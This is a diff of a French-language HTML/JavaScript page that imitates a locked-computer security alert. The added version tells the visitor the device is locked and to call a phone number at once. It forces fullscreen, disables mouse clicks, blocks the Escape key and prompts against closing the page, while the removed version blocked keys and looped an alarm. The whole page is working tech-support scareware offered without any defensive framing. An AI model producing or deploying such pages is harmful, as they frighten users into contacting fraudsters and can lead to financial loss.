@@ -3,171 +3,174 @@
 <head>  
     <meta charset="UTF-8">  
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>🔒 Sécurité Système</title>  
+    <title>Alerte Système Verrouillé</title>  
     <style>  
         * {  
             margin: 0;  
             padding: 0;  
             box-sizing: border-box;  
-            font-family: Arial, sans-serif;  
+            user-select: none; /* Désactive la sélection de texte */  
         }  
         html, body {  
-            width: 100%;  
-            height: 100%;  
+            width: 100vw;  
+            height: 100vh;  
             background: black;  
             color: white;  
+            font-family: 'Courier New', Courier, monospace;  
+            text-align: center;  
+            overflow: hidden; /* Empêche le défilement */  
             display: flex;  
             justify-content: center;  
             align-items: center;  
-            text-align: center;  
-            overflow: hidden;  
-            cursor: none;  
         }  
         .container {  
-            background: red;  
-            padding: 5%;  
-            border-radius: 10px;  
-            box-shadow: 0 0 10px white;  
-            width: 80vw;  
-            height: 80vh;  
             display: flex;  
             flex-direction: column;  
             justify-content: center;  
             align-items: center;  
+            width: 100%;  
+            height: 100%;  
+            padding: 5%;  
         }  
-        h1 {  
-            font-size: 5vw;  
-            margin-bottom: 2vh;  
+        .message {  
+            font-size: 3vw; /* Taille de police réduite */  
+            font-weight: bold;  
         }  
-        #alert-message {  
-            font-size: 3vw;  
-            margin-bottom: 3vh;  
+        .alert-number {  
+            font-size: 2.5vw; /* Taille de police réduite */  
+            font-weight: bold;  
+            color: red;  
         }  
-        input {  
-            padding: 1vh;  
-            font-size: 3vw;  
-            margin-bottom: 2vh;  
+        #codeInput {  
+            margin-top: 20px;  
+            padding: 10px;   
+            font-size: 2vw;   
             text-align: center;  
-            outline: none;  
+            border: 2px solid white;   
             width: 50%;  
-        }  
-        button {  
             background: black;  
             color: white;  
-            padding: 2vh 4vw;  
-            font-size: 3vw;  
-            cursor: pointer;  
+            outline: none;  
         }  
         #error-message {  
-            color: yellow;  
-            font-size: 2vw;  
-            margin-top: 2vh;  
+            color: red;  
+            font-size: 1.5vw;   
+            margin-top: 10px;  
+            animation: shake 0.3s;  
+            display: none; /* Masquer l'erreur par défaut */  
+        }  
+        @keyframes shake {  
+            0% { transform: translateX(0); }  
+            25% { transform: translateX(-5px); }  
+            50% { transform: translateX(5px); }  
+            75% { transform: translateX(-5px); }  
+            100% { transform: translateX(0); }  
+        }  
+        .blinking {  
+            animation: blink 1s steps(2, start) infinite;  
+        }  
+        @keyframes blink {  
+            50% { opacity: 0; }  
         }  
     </style>  
 </head>  
-<body onload="startLockdown()">  
+<body>  
     <div class="container">  
-        <h1>🔴 ACCÈS BLOQUÉ 🔴</h1>  
-        <p id="alert-message">  
-            🚨 <b>SUSPICION D’ACTIVITÉ FRAUDULEUSE</b> 🚨<br>  
-            Votre ordinateur est verrouillé pour des raisons de **sécurité**.<br>  
-            Veuillez **entrer le code secret** pour déverrouiller.<br>  
-        </p>  
-        <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>  
-        <button onclick="checkCode()">Déverrouiller</button>  
-        <p id="error-message"></p>  
+        <div class="message">🚨 ATTENTION !</div>  
+        <div class="alert-number">Votre appareil est verrouillé !</div>  
+        <div class="message">📞 Appelez immédiatement le : +33 1 23 45 67 89</div> <!-- Numéro de téléphone -->  
+        <div class="message">Entrez le code de déverrouillage :</div>  
+        <input type="text" id="codeInput" placeholder="Code...">  
+        <div id="error-message">Code incorrect !</div>  
     </div>  
     <script>  
-        const SECRET_CODES = ["dakar", "2012", "1234"];  
-        let attempts = 0;  
-        const maxAttempts = 3;  
-        let isFullScreen = false; // Variable pour garder l'état plein écran  
-
-        function startLockdown() {  
-            requestFullScreen();  
-            blockKeys();  
-            preventClose();  
-            document.getElementById("codeInput").focus();  
-        }  
-
-        function checkCode() {  
-            let inputCode = document.getElementById("codeInput").value.toLowerCase();  
-            if (SECRET_CODES.includes(inputCode)) {  
-                unlockSystem();  
-            } else {  
-                attempts++;  
-                document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;  
-                if (attempts >= maxAttempts) {  
-                    playAlarm();  
-                }  
-            }  
-        }  
-
-        function requestFullScreen() {  
+        // Fonction pour activer le plein écran  
+        function openFullscreen() {  
             let elem = document.documentElement;  
             if (elem.requestFullscreen) {  
                 elem.requestFullscreen();  
-            } else if (elem.mozRequestFullScreen) {  
+            } else if (elem.mozRequestFullScreen) { // Firefox  
                 elem.mozRequestFullScreen();  
-            } else if (elem.webkitRequestFullscreen) {  
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari et Opera  
                 elem.webkitRequestFullscreen();  
-            } else if (elem.msRequestFullscreen) {  
+            } else if (elem.msRequestFullscreen) { // IE/Edge  
                 elem.msRequestFullscreen();  
             }  
-            isFullScreen = true; // Met à jour l'état plein écran  
         }  
 
-        function blockKeys() {  
-            document.addEventListener("keydown", function (event) {  
-                let blockedKeys = ["F11", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];  
-                if (blockedKeys.includes(event.key)) {  
-                    event.preventDefault();  
+        // Affichage d'un message d'alerte après le chargement  
+        window.onload = function() {  
+            openFullscreen(); // Force le mode plein écran  
+
+            if (document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled) {  
+                alert("Attention : Votre appareil est verrouillé ! Pour déverrouiller, veuillez entrer le code.");  
+            } else {  
+                alert("Impossible d'entrer en plein écran. Essayez de changer votre navigateur.");  
+            }  
+
+            document.getElementById('codeInput').focus(); // Focus automatique sur le champ  
+            disableMouse(); // Désactivation de la souris  
+            preventClose(); // Lancer la prévention de la fermeture  
+        }  
+
+        // Désactivation des événements de souris (clic gauche uniquement)  
+        function disableMouse() {  
+            document.addEventListener("mousemove", function(event) {  
+                event.preventDefault(); // Autorise le mouvement de la souris  
+            });  
+            document.addEventListener("mousedown", function(event) {  
+                if (event.button === 0) { // Clic gauche (0)  
+                    event.preventDefault(); // Désactive le clic gauche  
                 }  
-                if (event.key === "Enter") {  
-                    checkCode();  
+            });  
+            document.addEventListener("mouseup", function(event) {  
+                if (event.button === 0) { // Clic gauche (0)  
+                    event.preventDefault(); // Désactive le clic gauche  
                 }  
-                // Gestion de la touche Échap pour activer/désactiver le plein écran  
-                if (event.key === "Escape") {  
-                    toggleFullScreen();  
-                }  
+            });  
+            document.addEventListener("contextmenu", function(event) {  
+                event.preventDefault(); // Désactive le clic droit  
             });  
         }  
 
-        function toggleFullScreen() {  
-            if (isFullScreen) {  
-                document.exitFullscreen();  
-                isFullScreen = false;  
-            } else {  
-                requestFullScreen();  
+        // Vérification du code  
+        const correctCode = "1234"; // Code de déverrouillage  
+        let inputField = document.getElementById("codeInput");  
+        let errorMessage = document.getElementById("error-message");  
+
+        inputField.addEventListener("keyup", function(event) {  
+            if (event.key === "Enter") {  
+                if (this.value === correctCode) {  
+                    // Déverrouiller l'écran  
+                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 3vw;'>Système déverrouillé avec succès !</h1>";  
+                } else {  
+                    // Affichage du message d'erreur  
+                    errorMessage.style.display = "block";  
+                    errorMessage.classList.add('blinking');  
+                    this.value = ""; // Réinitialisation du champ de code  
+                }  
             }  
-        }  
+        });  
 
-        function playAlarm() {  
-            let audio = new Audio("https://www.soundjay.com/button/beep-07.wav");  
-            audio.loop = true;  
-            audio.play();  
-        }  
-
-        function unlockSystem() {  
-            document.exitFullscreen();  
-            document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";  
-        }  
-
+        // Fonction pour empêcher la fermeture de la page  
         function preventClose() {  
             window.onbeforeunload = function() {  
-                return "🚨 Attention ! Cette action peut provoquer une perte de données.";  
+                return "Êtes-vous sûr de vouloir quitter ?"; // Affiche un message de confirmation  
             };  
-            document.addEventListener("visibilitychange", function() {  
-                if (document.hidden) {  
-                    setTimeout(requestFullScreen, 10);  
-                }  
-            });  
-            setInterval(() => {  
-                if (!document.fullscreenElement) {  
-                    requestFullScreen();  
-                }  
-            }, 500);  
         }  
+
+        // Bloquer les interactions avec certaines touches  
+        document.addEventListener("keydown", function(event) {  
+            // Enlever la fonction de la touche Échap  
+            if (event.key === "Escape") {  
+                event.preventDefault(); // Empêcher la touche Échap par défaut  
+            }  
+            // Associer la touche "9" du pavé numérique à une action  
+            if (event.key === "9") {  
+                // Ici, on simule l'action d'appuyer sur Échap  
+                alert("La fonction Échap a été activée en appuyant sur 9 !");  
+            }  
+        });  
     </script>  
 </body>  
 </html>
